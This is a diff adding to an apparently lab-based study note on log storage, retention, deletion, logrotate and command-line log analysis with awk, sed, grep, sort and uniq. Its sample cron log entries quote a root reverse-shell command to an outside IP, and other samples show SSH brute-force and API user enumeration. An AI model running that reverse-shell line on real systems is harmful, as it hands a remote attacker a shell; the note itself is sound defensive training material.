@@ -127,4 +127,254 @@
 			- Utilise tools that provide real-time monitoring and alerts for specific events
 		- Integration with Incident Management
 			- Ensure that the centralised system can integrate seamlessly with any incident management tools or protocols the infrastructure has in place
-	- 
+
+- Log Storage
+	- Can be various locations
+		- The local system from where the logs were generated
+		- A centralised repository
+		- Cloud-based
+	- Choices usually depend on the following factors:
+		- Security Requirements
+			- Stored in compliance with organisational or regulatory security protocols
+		- Accessibility Needs
+			- How efficiently (quickly) and by which parties will the logs need to be accessed can influence the choice of storage
+		- Storage Capacity
+			- The volume of logs generated may require a fair amount of significant storage space, also influencing the decision making process
+		- Cost Considerations
+			- Budget(s) almost always dictate which platform/choice of storage is the way in moving forward
+		- Compliance Regulations
+			- Industry regulations governing log storage can affect this decision making process
+		- Retention Policies
+			- The amount of retention time and ease of retrieval can affect the decision making process
+		- Disaster Recovery Plans (DR)
+			- Ensuring the availability of logs in the event of a system failure may require specific storage solutions
+
+- Log Retention
+	- Consider that log storage will not need to be forever - a balance between retaining logs for potential future needs and the cost for storage.
+	- Concepts:
+		- Hot Storage
+			- Logs from the last several months (3-6 usually) are most accessible.
+			- Query speeds should be near real-time (depending on the complexity of the query)
+		- Warm Storage
+			- Logs from six months to two years
+			- Acting as a 'data lake'
+			- Easily accessible, bot not as immediate, efficient to retrieve as Hot Storage
+		- Cold Storage
+			- Archives, or compressed logs, from two to five years
+			- Not easily accessible for the majority of the part
+			- Used for retroactive analysis or scoping purposes
+
+- Log Deletion
+	- Backing up of log files (full on important)
+	- Keeping a well defined Deletion Policy to ensure compliance with data protection laws and regulations. 
+	- Log deletion helps to:
+		- Maintain a manageable size of logs for analysis
+		- Comply with privacy regulations, such as GDPR - which require unnecessary data to be deleted
+		- Keep storage costs in balance
+
+- Best Practices - Log Storage, Retention and Deletion
+	- Determine the Storage, Retention and Deletion Policy based on both business requirements and legal requirements
+	- Regularly review and update guidelines as conditions and regulations change
+	- Automate the three processes to ensure consistency and to avoid human errors
+	- Encrypt sensitive logs to protect data
+	- Regular backups of the logs should be made - in particular, before deletion
+
+Tools
+- `rsyslog`
+- `rotate 24` in a `.conf` file will usually dictate how many versions of log files will be kept
+	- Provides support for message logging. Support of both Internet and Unix domain sockets enables the utility to support both local and remote logging
+- `logrotate`
+	- Log rotation is the process of controlling the size of log files
+		- Compressed, moved, renamed or deleted once they are too old or too large in size
+		- New log data is then directed into a new, fresh file
+	- A tool that automates log file rotation, compression, and management
+	- Ensuring log files are handled systematically. 
+	- Allows the automatic rotation, compression and removal of log files. 
+- An example:
+	```
+	/var/log/websrv-02/rsyslog_cron.log {
+		hourly
+		rotate 24
+		compress
+		lastaction
+			DATE=$(date +"%Y-%m-%d")
+			echo "$(date)" >> "/var/log/websrv-69/hashes_"$DATE"_rsyslog_cron.txt"
+			for i in $(seq 1 24); do
+				FILE="/var/log/websrv-02/rsyslog_cron.log.$i.gz"
+				if [ -f "$FILE" ]; then
+					HASH=$(/usr/bin/sha256sum "$FILE" | awk '{ print $1 }')
+					echo "rsyslog_cron.log.$i.gz "$HASH"" >> "/var/log/websrv-69/hashes_"$DATE"_rsyslog_cron.txt"
+				fi
+			done
+			systemctl restart rsyslog
+		endscript
+	}
+	```
+
+- Log Analysis Process
+	- When properly and skillfully leveraged, logs can enhance:
+		- System diagnostics
+		- Cyber security
+		- Regulatory compliance efforts
+	- Involves:
+		- Parsing
+		- Normalisation
+		- Sorting
+		- Classification
+		- Enrichment
+		- Correlation
+		- Visualisation
+		- Reporting
+	- Some tools:
+		- Splunk
+		- ELK
+		- Ad-hoc methods! :D
+		
+	- Data Sources:
+		- The systems or applications configured to log events or User activities
+		- The origin from which these glorious logs came from
+	- Parsing
+		- The breaking down the log data into more manageable and human understandable components
+		- Since there are a variety of formats depending on the sources from which the log(s) came, it's important to parse these logs to extract valuable information (from queries and the such)
+	- Normalisation
+		- Standardising parsed data
+		- Bringing the various log data and putting into a standard format
+		- Making comparing and analysing data from different sources (devices, apps, etc) easier
+		- Crucial in environments with multiple systems and applications , where each might generate logs in another format
+	- Sorting
+		- Vital aspect of log analysis
+		- It allows for efficient data retrieval and identification of patterns
+		- Logs can be sorted by variables, such as:
+			- Time
+			- Source
+			- Event Type
+			- Severity
+			- and any other parameter that could be present in the data
+		- More than useful, can be seen as critical when identifying trends and anomalies that signal operational issues or security incidents
+	- Classification
+		- Involves assigning categories to the logs based on their characteristics
+		- Teams can quickly filter and focus on those logs that matter most to the analysis taking place
+		- Similar to sorting, however, this is more classifying/categorising events to help identify potential issues or threats that perhaps could be overlooked
+	- Enrichment
+		- Adds context to logs to make them more meaningful and easier to analyse
+		- Could involve adding info like geographical data, use details, threat intelligence, or even data from other sources that can provide a complete picture of the event
+		- Makes the log(s) more valuable
+		- Enabling analysts to make better decisions and more accurately respond to incidents
+		- Log enrichment can be automated using machine learning, reducing the time and effort required for log analysis
+	- Correlation
+		- Involves linking related records and identifying connections between log entries
+		- This process helps detect patterns, trends and making the understanding of complex relationships between various log events easier
+	- Visualisation
+		- Represents log data in graphical formats, charts, graphs, heat maps and the such
+		- Makes pattern recognition much easier for humans, alongside with trends and anomalies to be more efficiently identified
+		- Also makes for an intuitive way to interpret large volumes of log data - making things more accessible and understandable
+	- Reporting
+		- Summarises log data into structured formats to provide insights, support decision making processes, or meet compliance requirements
+		- Effective reporting includes creating clear, concise log data summaries
+		- Catering to stakeholders' needs (management, other teams, or auditors)
+	
+	- Tools
+		- SIEMs
+			- Security Information and Event Management
+				- Splunk
+				- Elastic Search
+			- Open Source Tools
+				- Log-Viewer
+		- Linux-based systems can deploy the usual native tools like:
+			- `cat`
+			- `grep`
+			- `sed`
+			- `sort`
+			- `uniq`
+			- `awk`
+			- `sha256sum`
+		- Windows-based systems:
+			- EZ-Tools
+			- `Get-FileHash`
+
+	- Log Analysis Techniques
+		- Pattern Recognition
+		- Anomaly Detection
+		- Correlation Analysis
+		- Timeline Analysis
+		- Machine Learning and AI
+		- Visualisation 
+		- Statistical Analysis
+
+- Open-source Example
+	- Log Viewer
+		`34.253.159.159 - - [09/Aug/2024:09:23:35 +0000] "GET /_dummy HTTP/1.0" 302 102 "" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)" -`
+
+- Base-tool (Linux) Examples
+	- (`cat` `grep` `sed` `sort` `uni` `awk` )
+	- `jq` can be used to work with `json` files as well
+
+	- `awk` and `sed` - processing Nginx Access Log
+
+		Example log entry in `access.log`
+	
+		`34.253.159.159 - - [09/Aug/2024:07:48:32 +0000] "GET /api/v4/users/34 HTTP/1.0" 403 45 "http://gitlab.swiftspend.finance/" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36" -`
+		
+		Example `awk` and `sed` normalisation command
+			  
+		`awk -F'[][]' '{print "[" $2 "]", "--- /var/log/gitlab/nginx/access.log ---", "\"" $0 "\""}' /var/log/gitlab/nginx/access.log | sed "s/ +0000//g" > /tmp/parsed_consolidated.log`
+		
+		Will produce a parsed and consolidated entry like:
+		
+		`[09/Aug/2024:07:48:41] --- /var/log/gitlab/nginx/access.log --- "34.253.159.159 - - [09/Aug/2024:07:48:41] "GET /_conf HTTP/1.0" 302 102 "" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)" -"`
+
+	- `awk` and `sed` - processing rsyslog_cron.log
+		
+		Example log entry in `rsyslog_cron.log`
+		
+		`Aug  9 09:50:01 WEBSRV-02 CRON[30266]: (root) CMD (/bin/bash -c "/bin/bash -i >& /dev/tcp/34.253.159.159/9999 0>&1")`
+		
+		Example `awk` and `sed` normalisation command
+		
+		`awk '{ original_line = $0; gsub(/ /, "/", $1); printf "[%s%s/2023:%s] --- /var/log/websrv-02/rsyslog_cron.log --- \"%s\"\n", $2, $1, $3, original_line }' /var/log/websrv-02/rsyslog_cron.log >> /tmp/parsed_consolidated.log`
+		
+		Will produce a parsed and consolidated entry like:
+		`
+		`[9/Aug/2023:09:55:01] --- /var/log/websrv-02/rsyslog_cron.log --- "Aug  9 09:55:01 WEBSRV-02 CRON[31180]: (root) CMD (/bin/bash -c "/bin/bash -i >& /dev/tcp/34.253.159.159/9999 0>&1")"`
+
+	- `awk` and `sed` processing rsyslog_sshd.log
+		
+		Example log entry in `rsyslog_sshd.log`
+		
+		`Aug  9 09:59:13 WEBSRV-02 sshd[32001]: PAM 1 more authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=34.253.159.159`
+		
+		Example `awk` and `sed` normalisation command
+		
+		`awk '{ original_line = $0; gsub(/ /, "/", $1); printf "[%s%s/2023:%s] --- /var/log/websrv-02/rsyslog_sshd.log --- \"%s\"\n", $2, $1, $3, original_line }' /var/log/websrv-02/rsyslog_sshd.log >> /tmp/parsed_consolidated.log`
+				
+		Will produce a parsed and consolidated entry like:
+		
+		`9Aug/2023:09:23:06] --- /var/log/websrv-02/rsyslog_sshd.log -- "Aug  9 09:23:06 WEBSRV-02 sshd[25079]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=34.253.159.159 "`
+
+	- `awk` and `sed` processing api_json.log
+	  
+	  Example log entry in `api_json.log`
+	  
+	  `{"time":"2024-08-09T07:41:32.224Z","severity":"INFO","duration_s":0.00272,"db_duration_s":0.0,"view_duration_s":0.00272,"status":403,"method":"GET","path":"/api/v4/users/29","params":[],"host":"localhost","remote_ip":"34.253.159.159, 127.0.0.1, 34.253.159.159","ua":"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36","route":"/api/:version/users/:id","queue_duration_s":0.121997,"db_count":0,"db_write_count":0,"db_cached_count":0,"db_replica_count":0,"db_primary_count":0,"db_main_count":0,"db_main_replica_count":0,"db_replica_cached_count":0,"db_primary_cached_count":0,"db_main_cached_count":0,"db_main_replica_cached_count":0,"db_replica_wal_count":0,"db_primary_wal_count":0,"db_main_wal_count":0,"db_main_replica_wal_count":0,"db_replica_wal_cached_count":0,"db_primary_wal_cached_count":0,"db_main_wal_cached_count":0,"db_main_replica_wal_cached_count":0,"db_replica_duration_s":0.0,"db_primary_duration_s":0.0,"db_main_duration_s":0.0,"db_main_replica_duration_s":0.0,"cpu_s":0.05783,"mem_objects":3911,"mem_bytes":256536,"mem_mallocs":879,"mem_total_bytes":412976,"pid":3149,"worker_id":"puma_1","rate_limiting_gates":[],"correlation_id":"01J4V1BV096QEMGGPW61KP8W97","meta.client_id":"ip/34.253.159.159","meta.caller_id":"GET /api/:version/users/:id","meta.remote_ip":"34.253.159.159","meta.feature_category":"users","request_urgency":"low","target_duration_s":5}`
+	  
+	  Example `awk` and `sed` normalisation command
+	  
+	  `awk -F'"' '{timestamp = $4; converted = strftime("[%d/%b/%Y:%H:%M:%S]", mktime(substr(timestamp, 1, 4) " " substr(timestamp, 6, 2) " " substr(timestamp, 9, 2) " " substr(timestamp, 12, 2) " " substr(timestamp, 15, 2) " " substr(timestamp, 18, 2) " 0 0")); print converted, "--- /var/log/gitlab/gitlab-rails/api_json.log ---", "\""$0"\""}' /var/log/gitlab/gitlab-rails/api_json.log >> /tmp/parsed_consolidated.log`
+	  
+	  `awk -F'"' '{timestamp = $4; converted = strftime("[%d/%b/%Y:%H:%M:%S]", mktime(substr(timestamp, 1, 4) " " substr(timestamp, 6, 2) " " substr(timestamp, 9, 2) " " substr(timestamp, 12, 2) " " substr(timestamp, 15, 2) " " substr(timestamp, 18, 2) " 0 0")); print converted, "--- /var/log/gitlab/gitlab-rails/api_json.log ---", "\""$0"\""}' /var/log/gitlab/gitlab-rails/api_json.log >> /tmp/parsed_consolidated.log`
+	  
+	  Will produce a parsed and consolidated entry like:
+	  
+	  `[09/Aug/2024:07:47:31] --- /var/log/gitlab/gitlab-rails/api_json.log --- "{"time":"2024-08-09T07:47:31.558Z","severity":"INFO","duration_s":0.02871,"db_duration_s":0.0,"view_duration_s":0.02871,"status":403,"method":"GET","path":"/api/v4/users/17","params":[],"host":"localhost","remote_ip":"34.253.159.159, 127.0.0.1, 34.253.159.159","ua":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36","route":"/api/:version/users/:id","queue_duration_s":0.122769,"db_count":0,"db_write_count":0,"db_cached_count":0,"db_replica_count":0,"db_primary_count":0,"db_main_count":0,"db_main_replica_count":0,"db_replica_cached_count":0,"db_primary_cached_count":0,"db_main_cached_count":0,"db_main_replica_cached_count":0,"db_replica_wal_count":0,"db_primary_wal_count":0,"db_main_wal_count":0,"db_main_replica_wal_count":0,"db_replica_wal_cached_count":0,"db_primary_wal_cached_count":0,"db_main_wal_cached_count":0,"db_main_replica_wal_cached_count":0,"db_replica_duration_s":0.0,"db_primary_duration_s":0.0,"db_main_duration_s":0.0,"db_main_replica_duration_s":0.0,"cpu_s":0.053657,"mem_objects":3914,"mem_bytes":256552,"mem_mallocs":879,"mem_total_bytes":413112,"pid":5031,"worker_id":"puma_0","rate_limiting_gates":[],"correlation_id":"01J4V1PSYB7V3E1X0RBFHF98CB","meta.client_id":"ip/34.253.159.159","meta.caller_id":"GET /api/:version/users/:id","meta.remote_ip":"34.253.159.159","meta.feature_category":"users","request_urgency":"low","target_duration_s":5}"`
+
+- Using `grep` to then go through and filter specific entries, requirements (ie IP addresses, date/time, etc)
+	`grep "34.253.159.159" /tmp/parsed_consolidated.log > /tmp/filtered_consolidated.log`
+
+- Using `sort` to log all entries by date and time:
+	`sort /tmp/parsed_consolidated.log > /tmp/sort_parsed_consolidated.log`
+
+- Using `uniq` to remove duplicate entries:
+	`uniq /tmp/sort_parsed_consolidated.log > /tmp/uniq_sort_parsed_consolidated.log`
+
+- These can then be accessed by `Log Viewer` in a Web-browser, for example:
+	`http://10.10.36.19:8111/log?path=%2Ftmp%2Funiq_sort_parsed_consolidated.log`
